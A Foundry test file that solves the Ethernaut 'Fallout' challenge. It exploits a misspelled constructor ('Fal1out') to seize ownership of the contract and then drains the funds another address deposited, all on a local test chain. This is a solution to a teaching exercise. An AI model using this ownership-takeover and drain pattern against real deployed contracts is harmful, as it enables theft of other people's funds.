//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Fallout} from "../src/level3.sol";
import {Test, console} from "forge-std/Test.sol";

contract FalloutTest is Test {
    Fallout public _fallout;
    address public player;
    address public attacker;
    address public attacker2 = makeAddr("attacker2");

    function setUp() public {
        player = address(0x344);
        attacker = address(0x457);
        vm.deal(player, 10 ether); // Give player some ETH
        vm.deal(attacker, 10 ether);
        vm.deal(attacker2, 10 ether);
        vm.startPrank(player);
        _fallout = new Fallout();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker2);
        _fallout.allocate{value: 2 ether}();
        vm.stopPrank();
        vm.startPrank(attacker);
        // _fallout.Fallout{value: 0.001 ether}();
        console.log("attacker balance before: ", attacker.balance);
        console.log("contract balance before: ", address(_fallout).balance);
        _fallout.Fal1out{value: 2 ether}();
        console.log("attacker balance after: ", attacker.balance);
        console.log("contract balance after:", address(_fallout).balance);

        _fallout.collectAllocations();
        console.log("attacker balance after collect: ", attacker.balance);
        assertTrue(
            address(_fallout).balance == 0,
            "attacker balance should be 0"
        );
        vm.stopPrank();
    }
}
